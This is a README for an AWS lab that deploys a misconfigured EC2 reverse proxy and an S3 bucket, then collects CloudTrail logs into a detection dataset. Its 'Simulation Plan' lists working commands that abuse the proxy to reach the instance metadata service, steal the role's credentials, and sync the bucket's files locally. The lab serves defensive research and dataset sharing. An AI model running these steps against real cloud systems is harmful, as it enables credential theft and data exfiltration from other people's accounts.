# Cloud Breach S3

An environment to replicate an adversary abusing a misconfigured EC2 reverse proxy to obtain instance profile keys (Access and Secret) and eventually exfiltrate files from an S3 bucket. The configurations and deployment templates were adapted from the [Rhino Security labs - Cloud Goat project](https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/cloud_breach_s3). The automatic cloudtrail configurations and templates were added to the environment with the main goal to extract the logs and share the dataset with the InfoSec community via the [Mordor project](https://mordordatasets.com/introduction.html).

# Resources Deployed

* S3 bucket (Sensitive Data)
    * One file uploaded at deployment time
* EC2
    * Nginx Installed (Reverse Proxy)
    * BankingWAFRole IAM Role
        * Full Access to S3 Bucket
* CloudTrail Trail
    * GlobalS3DataEventsTrail
        * Data Resource: S3 Bucket
        * API & Management Events
* S3 Bucket (CloudTrail)
* EC2 (Log Collector)
    * Logstash
        * S3 Input Plugin
        * Kafka Output Plugin
    * Kafka Docker Container
        * Topic: cloudtrail
    * Kafkacat
        * Ready to consume logs from kafka

# Pre-Deployment

**Pre-Requisites:**

* [AWS CLI Installed](https://blacksmith.readthedocs.io/en/latest/aws_cli_setup.html)
* AWS User Account

## Create Demo User Account

```
aws iam create-access-key --user-name stevie
```

## Enable Programmatic Access

Save the access key and secret keys output after running the following command:

```
aws iam create-access-key --user-name stevie
```

## Attach AdministratorAccess Policy 

```
aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name stevie
```

## Configure Demo User AWS Profile

use the keys obtained after enabling programmatic access to the demo user account.

```
aws configure --profile stevie
```

## Create Key Pair

```
aws --region us-east-1 ec2 --profile stevie create-key-pair --key-name aws-ubuntu-key --query 'KeyMaterial' --output text > aws-ubuntu-key.pem
```

# Deploy Environment

* Update VPC parameters

```
./deploy-cloud-breach.sh -r us-east-1 -p stevie
```

# Simulation Plan

Steps from [Rhino Security labs - Cloud Goat project: Cloud Breach S3](https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/cloud_breach_s3)

```
curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'

curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'

​aws configure --profile erratic

​aws_session_token = <session-token>

​aws s3 ls --profile erratic

​aws s3 sync s3://<bucket-name> ./cardholder-data --profile erratic

```

# Data Collection

## SSH to EC2 Log Collector

```
ssh -v -i ~/Documents/keys/aws-ubuntu-key.pem ubuntu@<EC2 Log Collector Public IP>
```
## Verify Logstash

```
tail -f /var/log/logstash/logstash-plain.log
```

## Verify Kafka Broker

Verify if the Kafka broker is running, the `cloudtrail` topic is available and there is data already being collected from the cloudtrail S3 bucket:

```
kafkacat -b localhost:9092 -t cloudtrail -C
```

## Collect Cloudtrail Logs (Consume)

```
kafkacat -b localhost:9092 -t cloudtrail -C -o end > ec2_proxy_s3_exfiltration_$(date +%F%H%M%S).json
```

# References

* https://techcommunity.microsoft.com/t5/azure-sentinel/hunting-for-capital-one-breach-ttps-in-aws-logs-using-azure/ba-p/1014258
* https://techcommunity.microsoft.com/t5/azure-sentinel/hunting-for-capital-one-breach-ttps-in-aws-logs-using-azure/ba-p/1019767
* https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/cloud_breach_s3
* https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/cloud_breach_s3/cheat_sheet.md
* https://docs.aws.amazon.com/IAM/latest/UserGuide/id_users_create.html#id_users_create_cliwpsapi
* https://docs.aws.amazon.com/cli/latest/reference/iam/create-access-key.html
* https://www.elastic.co/guide/en/logstash/current/plugins-codecs-cloudtrail.html
* https://www.elastic.co/guide/en/logstash/current/plugins-inputs-s3.html
* https://github.com/Azure/Azure-Sentinel/blob/master/Parsers/Logstash/input-aws_s3-output-loganalytics.conf
